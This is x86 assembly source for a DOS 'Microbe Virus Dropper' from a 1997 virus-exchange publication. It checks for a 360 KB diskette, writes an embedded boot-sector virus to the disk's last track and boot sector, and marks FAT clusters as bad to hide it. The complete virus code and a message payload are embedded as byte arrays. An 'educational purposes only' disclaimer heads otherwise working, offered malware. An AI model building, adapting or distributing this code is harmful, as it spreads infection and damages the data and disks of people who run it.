
 _microbe_dropper segment 'code'
 assume cs:_microbe_dropper, ds:_microbe_dropper
 
 org 100h
 
 _is_dropper:
         mov     bp,3
         call    _print_program_name
 
                 db  13
                 db  'Microbe Virus Dropper',13,10,10
                 db  'HEX-FILES No. 1',13,10
                 db  '1997 (c) Putoksa Kawayan',13,10,10
                 db  'HEX-FILES and Putoksa Kawayan are not responsible '
                 db  'for all actual, implied and',13,10
                 db  'imaginary damage brought about by the use, misuse '
                 db  'or non-use of this virii.',13,10
                 db  'Anybody who executes this virii bears full '
                 db  'responsibility for any untoward',13,10
                 db  'incident that may occur.',13,10,10
                 db  'This virii is strictly for educational '
                 db  'or research purposes only.',13,10,10,10
                 db  'Drive A: $'
 _is_drive_b     db  'Drive B: $'
 _is_360_only    db  'Microbe infects 360 kb diskettes only.',13,10,'$'
 _disk_error     db  'Disk access error.',13,10,'$'
 _write_error    db  'Error writing to disk',13,10,'$'
 _read_error_fat db  'Error reading File Allocation Table.',13,10,'$'
 _fat_no_change  db  'Could not modify File Allocation Table but '
 _is_infect_ok   db  'Microbe virus dropped.',13,10,'$'
 
         align   2
 __access_disk_read:
         mov     di,201h
         mov     bx,offset _saved_orig_dbs
 __access_disk_boot:
         mov     cx,1
 __access_disk_fat:
         mov     dh,0
 __access_disk_generic:
         mov     si,bp
 __access_disk_again:
         mov     ax,di
         int     13h
         jc      __access_disk_reset
         stc
 __access_disk_error:
         ret
 
         align   2
 __access_disk_reset:
         clc
         dec     si
         jz      __access_disk_error
         mov     ah,0
         int     13h
         jmp     __access_disk_again
 
         align   2
 _print_program_name:
         pop     dx
         mov     ah,9
         int     21h
         mov     dl,0
         call    __access_disk_read
         jc      _see_if_360
         mov     dx,offset _disk_error
 _check_drive_b:
         mov     ah,9
         int     21h
         mov     dx,offset _is_drive_b
         mov     ah,9
         int     21h
         mov     byte ptr _fat_read_ok+1,0     ;clear our switch
         mov     dl,1
         call    __access_disk_read
         jc      _see_if_360
         mov     dx,offset _disk_error
         mov     ah,9
         int     21h
         mov     ah,4ch
         int     21h
 
         align   2
 _see_if_360:
         mov     al,[bx+15h]                  ;get media descriptor byte
         cmp     al,0fdh                      ;is it 360 kb dikette?
         je      _write_virus_to_last_track
         and     al,0f0h                      ;is it a valid mdb?
         cmp     al,0f0h
         jne     _get_mdb_from_fat
 _see_what_drive:
         mov     al,dl
         mov     dx,offset _is_360_only
 _show_my_err:
         or      al,al                        ;if drive a: 
         jz      _check_drive_b               ;then try drive b:
         mov     ah,9                         ;else, terminate
         int     21h
         mov     ah,4ch
         int     21h
 
         align   2
 _get_mdb_from_fat:
         mov     bx,offset _fat_read_buffer
         mov     di,202h
         mov     cx,2
         call    __access_disk_fat            ;read first copy of fat
         jc      _check_fat_mdb
         mov     al,dl
         mov     dx,offset _read_error_fat
         jmp     _show_my_err
 
         align   2
 _check_fat_mdb:
         cmp     byte ptr [bx],0fdh           ;verify if 360 kb
         jne     _see_what_drive
         mov     byte ptr _fat_read_ok+1,1
 
 _write_virus_to_last_track:
         mov     bx,offset _virus_boot_sect
         mov     di,307h
         mov     cx,2702h
         mov     dh,1
         call    __access_disk_generic
         jc      _write_virus_dbs
         mov     al,dl
         mov     dx,offset _write_error
         jmp     _show_my_err
 
         align   2
 _write_virus_dbs:
         mov     di,301h
         call    __access_disk_boot
         jc      _read_fat
         mov     al,dl
         mov     dx,offset _write_error
         jmp     _show_my_err
 
         align   2
 _read_fat:
         mov     bx,offset _fat_read_buffer
 _fat_read_ok:
         mov     al,0                    ; if 0, fat not in buffer
         or      al,al
         jnz     _mark_fat
         mov     cx,2
         mov     di,202h
         call    __access_disk_fat
         jnc     _show_my_err_and_exit
         
         cmp     byte ptr [bx],0fdh      ; verify if 360 kb diskette
         jne     _show_my_err_and_exit
 
 _mark_fat:
         add     bx,200h                      ; mark bad clusters 
         mov     word ptr [bx+10h],7ff7h      ; copied from virus
         mov     word ptr [bx+12h],0f7ffh
         mov     word ptr [bx+14h],0ff7fh
         mov     cx,3
         mov     di,301h                      ; write modified fat
         call    __access_disk_fat
         jc      _show_no_err
 _show_my_err_and_exit:
         mov     dx,offset _fat_no_change
         jmp     short _is_err_to_end
 
         align   2
 _show_no_err:
         mov     dx,offset _is_infect_ok
 _is_err_to_end:
         mov     ah,9
         int     21h
         mov     ah,4ch
         int     21h
 
 
         align   16
 ;======================================================
 ; we are dumping the original virus code because we 
 ; want to preserve it.
 ;======================================================
 
 _virus_boot_sect db   0fah,0ebh,5,90h,34h,12h,25h,12h,8ch,0c8h,8eh,0d8h
                  db   8eh,0d0h,0bch,0,0f0h,0fbh,0a1h,13h,4,2dh,4,0,0a3h
                  db   13h,4,0b1h,6,0d3h,0e0h,8eh,0c0h,6,0c7h,6,0d7h,1,0
                  db   0,0c7h,6,0d9h,1,8,0,0c6h,6,0dbh,1,2,0b9h,4,0,51h
                  db   0b4h,2,0b0h,1,0b5h,27h,8ah,0eh,0dbh,1,0b6h,1,0b2h,0
                  db   8bh,1eh,0d7h,1,0cdh,13h,59h,73h,8,0b4h,0,0cdh,13h,0e2h
                  db   0e2h,0cdh,18h,8bh,1eh,0d7h,1,81h,0c3h,0,2,89h,1eh,0d7h
                  db   1,8ah,0eh,0dbh,1,0feh,0c1h,88h,0eh,0dbh,1,8bh,0eh,0d9h
                  db   1,49h,89h,0eh,0d9h,1,83h,0f9h,0,75h,0b9h,8ch,0c0h,8eh
                  db   0d8h,0b9h,4,0,51h,0b4h,2,0b0h,1,0b5h,0,0b1h,1,0b6h,0
                  db   0b2h,0,0bbh,0,0eh,0cdh,13h,59h,73h,8,0b4h,0,0cdh,13h
                  db   0e2h,0e5h,0cdh,18h,8ah,2eh,3,0eh,0feh,0c5h,80h,0fdh
                  db   0a4h,7fh,24h,88h,2eh,3,0eh,0b9h,4,0,51h,0b4h,3,0b0h
                  db   1,0b5h,0,0b1h,1,0b6h,0,0b2h,0,0bbh,0,0eh,0cdh,13h,59h
                  db   73h,0dh,0b4h,0,0cdh,13h,0e2h,0e5h,0ebh,5,0b8h,0,4
                  db   50h,0cbh,0b8h,5fh,4,50h,0cbh,0,0,0,0,0,0,0,0,0
                  db   0fah,0ebh,5,90h,34h,12h,25h,12h,8ch,0c8h,8eh,0d8h,8eh
                  db   0d0h,0bch,0,0f0h,0fbh,0a1h,13h,4,2dh,4,0,0a3h,13h,4
                  db   0b1h,6,0d3h,0e0h,8eh,0c0h,6,0c7h,6,0d7h,1,0,0,0c7h,6
                  db   0d9h,1,8,0,0c6h,6,0dbh,1,2,0b9h,4,0,51h,0b4h,2,0b0h,1
                  db   0b5h,27h,8ah,0eh,0dbh,1,0b6h,1,0b2h,0,8bh,1eh,0d7h,1
                  db   0cdh,13h,59h,73h,8,0b4h,0,0cdh,13h,0e2h,0e2h,0cdh,18h
                  db   8bh,1eh,0d7h,1,81h,0c3h,0,2,89h,1eh,0d7h,1,8ah,0eh,0dbh
                  db   1,0feh,0c1h,88h,0eh,0dbh,1,8bh,0eh,0d9h,1,49h,89h,0eh
                  db   0d9h,1,83h,0f9h,0,75h,0b9h,8ch,0c0h,8eh,0d8h,0b9h,4
                  db   0,51h,0b4h,2,0b0h,1,0b5h,0,0b1h,1,0b6h,0,0b2h,0,0bbh,0
                  db   0eh,0cdh,13h,59h,73h,8,0b4h,0,0cdh,13h,0e2h,0e5h,0cdh
                  db   18h,8ah,2eh,0c0h,6,0c7h,6,0d7h,1,0,0,0c7h,6,0d9h,1,8,0
                  db   0c6h,6,0dbh,1,2,0b9h,4,0,51h,0b4h,2,0b0h,1,0b5h,27h,8ah
                  db   0eh,0dbh,1,0b6h,1,0b2h,0,8bh,1eh,0d7h,1,0cdh,13h,59h
                  db   73h,8,0b4h,0,0cdh,13h,0e2h,0e2h,0cdh,18h,8bh,1eh,0d7h
                  db   1,81h,0c3h,0,2,89h,1eh,0d7h,1,8ah,0eh,0dbh,1,0feh,0c1h
                  db   88h,0eh,0dbh,1,8bh,0eh,0d9h,1,49h,89h,0eh,0d9h,1,83h
                  db   0f9h,0,75h,0b9h,8ch,0c0h,8eh,0d8h,0b9h,4,0,51h,0b4h,2
                  db   0b0h,1,0b5h,0,0b1h,1,0b6h,0,0b2h,0,0bbh,0,0eh,0cdh,13h
                  db   59h,73h,8,0b4h,0,0cdh,13h,0e2h,0e5h,0cdh,18h,8ah,2eh
 _saved_orig_dbs  db   200h dup (?)
 _virus_main_code db   0b4h,6,0b0h,18h,0b7h,7,0b5h,0,0b1h,0,0b6h,18h,0b2h,4fh
                  db   0cdh,10h,0b4h,2,0b7h,0,0b6h,0,0b2h,0,0cdh,10h,0bbh,0
                  db   0ah,0b9h,8,0,51h,0b9h,29h,0,51h,53h,0b1h,4,8ah,7,0d2h
                  db   0c0h,0b4h,9,0b7h,0,0b3h,70h,0b9h,1,0,0cdh,10h,0b4h,3
                  db   0b7h,0,0cdh,10h,0feh,0c2h,0b4h,2,0b7h,0,0cdh,10h,5bh
                  db   59h,43h,0e2h,0dah,53h,0b4h,3,0b7h,0,0cdh,10h,0feh,0c6h
                  db   0b4h,2,0b7h,0,0b2h,0,0cdh,10h,5bh,59h,0e2h,0c1h,31h
                  db   0c0h,8eh,0d8h,8eh,0c0h,0b9h,4,0,51h,0b4h,2,0b0h,1,0b5h
                  db   27h,0b1h,3,0b6h,1,0b2h,0,0bbh,0,7ch,0cdh,13h,59h,73h,8
                  db   0b4h,0,0cdh,13h,0e2h,0e5h,0cdh,18h,0a1h,4ch,0,0a3h,0fch
                  db   1,0a1h,4eh,0,0a3h,0feh,1,0b8h,0a1h,4,0a3h,4ch,0,8ch
                  db   0c8h,0a3h,4eh,0,0eah,0,7ch,0,0,0fbh,50h,53h,51h,52h
                  db   1eh,6,50h,8ch,0c8h,8eh,0d8h,8eh,0c0h,58h,88h,2eh,0cah
                  db   6,88h,0eh,0cbh,6,88h,36h,0cch,6,80h,0fah,2,76h,3,0e9h
                  db   72h,1,80h,0fch,2,74h,8,80h,0fch,3,74h,3,0e9h,65h,1,0b9h
                  db   4,0,51h,0b4h,2,0b0h,1,0b5h,0,0b1h,1,0b6h,0,0bbh,0,0eh
                  db   0cdh,7fh,59h,73h,9,0b4h,0,0cdh,7fh,0e2h,0e7h,0e9h,46h,1
                  db   81h,3eh,4,0eh,34h,12h,75h,3,0e9h,5fh,1,0b9h,4,0,51h
                  db   0b4h,2,0b0h,1,0b5h,0,0b1h,2,0bbh,0,0eh,0cdh,7fh,59h,73h
                  db   9,0b4h,0,0cdh,7fh,0e2h,0e9h,0e9h,1eh,1,80h,3eh,0,0eh
                  db   0fdh,74h,3,0e9h,14h,1,0b9h,4,0,51h,0b4h,2,0b0h,1,0b5h
                  db   0,0b1h,3,0b6h,0,0bbh,0,0eh,0cdh,7fh,59h,73h,9,0b4h,0
                  db   0cdh,7fh,0e2h,0e7h,0e9h,0f5h,0,0c7h,6,10h,0eh,0f7h,7fh
                  db   0c7h,6,12h,0eh,0ffh,0f7h,0c7h,6,14h,0eh,7fh,0ffh,0b9h,4
                  db   0,51h,0b4h,3,0b0h,1,0b5h,0,0b1h,3,0b6h,0,0bbh,0,0eh
                  db   0cdh,7fh,59h,73h,9,0b4h,0,0cdh,7fh,0e2h,0e7h,0e9h,0c4h
                  db   0,0b9h,4,0,51h,0b4h,2,0b0h,1,0b5h,0,0b1h,1,0b6h,0,0bbh
                  db   0,0eh,0cdh,7fh,59h,73h,6,0b4h,0,0cdh,7fh,0e2h,0e7h,0b9h
                  db   4,0,51h,0b4h,3,0b0h,1,0b5h,27h,0b1h,3,0b6h,1,0bbh,0,0eh
                  db   0cdh,7fh,59h,73h,6,0b4h,0,0cdh,7fh,0e2h,0e7h,0b9h,4,0
                  db   51h,0b4h,3,0b0h,1,0b5h,0,0b1h,1,0b6h,0,0bbh,0,0,0cdh
                  db   7fh,59h,73h,6,0b4h,0,0cdh,7fh,0e2h,0e7h,0b9h,4,0,51h
                  db   0b4h,3,0b0h,1,0b5h,27h,0b1h,2,0b6h,1,0bbh,0,0,0cdh,7fh
                  db   59h,73h,6,0b4h,0,0cdh,7fh,0e2h,0e7h,0b9h,4,0,51h,0b4h,3
                  db   0b0h,1,0b5h,27h,0b1h,4,0b6h,1,0bbh,0,4,0cdh,7fh,59h,73h
                  db   6,0b4h,0,0cdh,7fh,0e2h,0e7h,0b9h,4,0,51h,0b4h,3,0b0h,1
                  db   0b5h,27h,0b1h,5,0b6h,1,0bbh,0,6,0cdh,7fh,59h,73h,6,0b4h
                  db   0,0cdh,7fh,0e2h,0e7h,0b9h,4,0,51h,0b4h,3,0b0h,1,0b5h
                  db   27h,0b1h,7,0b6h,1,0bbh,0,0ah,0cdh,7fh,59h,73h,6,0b4h,0
                  db   0cdh,7fh,0e2h,0e7h,0b4h,0,0cdh,7fh,7,1fh,5ah,59h,5bh
                  db   58h,0cdh,7fh,0cah,2,0,0b4h,0,0cdh,7fh,7,1fh,5ah,59h,5bh
                  db   58h,0b5h,27h,0b1h,3,0b6h,1,0cdh,7fh,0cah,2,0,80h,3eh
                  db   0cah,6,0,75h,10h,80h,3eh,0cbh,6,1,75h,9,80h,3eh,0cch,6
                  db   0,75h,2,0ebh,0d4h,81h,3eh,6,0eh,25h,12h,74h,0bdh,81h
                  db   3eh,1,0eh,0e9h,4ah,74h,3,0e9h,77h,0feh,0b9h,4,0,51h
                  db   0b4h,2,0b0h,1,8ah,2eh,8,0eh,8ah,0eh,7,0eh,8ah,36h,6
                  db   0eh,0bbh,0,0ch,0cdh,7fh,59h,73h,8,0b4h,0,0cdh,7fh,0e2h
                  db   0e1h,0ebh,8eh,0b9h,4,0,51h,0b4h,3,0b0h,1,0b5h,0,0b1h,1
                  db   0b6h,0,0bbh,0,0ch,0cdh,7fh,59h,73h,9,0b4h,0,0cdh,7fh
                  db   0e2h,0e7h,0e9h,6fh,0ffh,0e9h,31h,0feh,0,6,0,0,0,0
                  db   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                  db   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
 _fill_sector     db   100h dup (0)
 _sector_not_used db   200h dup (0f6h)
 _virus_message   db   0adh,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,0fbh,3bh,0ffh,0ffh,45h,86h,96h,37h,0ffh,0ffh,0ffh
                  db   0d4h,94h,34h,25h,0f4h,24h,54h,0ffh,0ffh,0ffh,96h,37h
                  db   0ffh,0ffh,46h,56h,46h,96h,36h,16h,47h,56h,46h,0ffh
                  db   0ffh,0ffh,47h,0f6h,0ffh,0ffh,3bh,3bh,0ffh,0ffh,72h
                  db   0d4h,96h,36h,27h,0f6h,36h,86h,96h,07h,37h,0ffh,94h
                  db   0e6h,36h,0e2h,72h,0c2h,0ffh,34h,56h,26h,57h,0ffh,34h
                  db   96h,47h,97h,0c2h,0ffh,05h,86h,96h,0c6h,0e2h,0ffh,0ffh
                  db   3bh,3bh,0ffh,0ffh,94h,0e6h,0ffh,0ffh,16h,07h,07h,27h
                  db   56h,36h,96h,16h,47h,96h,0f6h,0e6h,0ffh,0ffh,66h,0f6h
                  db   27h,0ffh,0ffh,47h,86h,56h,0ffh,0ffh,17h,57h,16h,0c6h
                  db   96h,47h,97h,0ffh,0ffh,3bh,3bh,0ffh,0ffh,47h,27h,16h
                  db   96h,0e6h,96h,0e6h,76h,0ffh,96h,47h,0ffh,07h,27h,0f6h
                  db   67h,96h,46h,56h,46h,0ffh,57h,37h,0e2h,0ffh,0ffh,0ffh
                  db   0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,3bh
                  db   3bh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh
                  db   0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh
                  db   0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh
                  db   0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,3bh,3bh,0ffh,0ffh
                  db   03h,23h,0f2h,13h,93h,0f2h,83h,83h,0ffh,0ffh,0ffh,0ffh
                  db   0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh,0efh,0ffh
                  db   0d4h,94h,34h,25h,0f4h,0d4h,14h,74h,94h,34h,0ffh,0efh
                  db   0ffh,0ffh,3bh,0ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,9dh,0adh,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch,4ch
                  db   4ch,4ch,4ch,4ch,4ch,4ch,0fbh,3bh,0ffh,0ffh,45h,86h
                  db   96h,37h,0ffh,0ffh,0ffh,0d4h,94h,34h,25h,0f4h,24h,54h
                  db   0ffh,0ffh,0ffh,96h,37h,0ffh,0ffh,46h,56h,46h,96h,36h
                  db   16h,47h,56h,46h,0ffh,0ffh,0ffh,47h,0f6h,0ffh,0ffh,3bh
                  db   3bh,0ffh,0ffh,72h,0d4h,96h,36h,27h,0f6h,36h,86h,96h
                  db   07h,37h,0ffh,94h,0e6h,36h,0e2h,72h,0c2h,0ffh,34h,56h
                  db   26h,57h,0ffh,34h,96h,47h,97h,0c2h,0ffh,05h,86h,96h
                  db   0c6h,0e2h,0ffh,0ffh,3bh,3bh,0ffh,0ffh,94h,0e6h,0ffh
                  db   0ffh,16h,07h,07h,27h,56h,36h,96h,16h,47h,96h,0f6h
                  db   0e6h,0ffh,0ffh,66h,0f6h,27h,0ffh,0ffh,47h,86h,56h
                  db   0ffh,0ffh,17h,57h,16h,0c6h,96h,47h,97h,0ffh,0ffh
                  db   3bh,3bh,0ffh,0ffh,47h,27h,16h,96h,0e6h,96h,0e6h
                  db   76h,0ffh,96h,47h,0ffh,07h,27h,0f6h,67h,96h
 _sector_used_not db   200h dup (0f6h)
 _fat_read_buffer db   1ah
                       
 _microbe_dropper ends
 
         end     _is_dropper
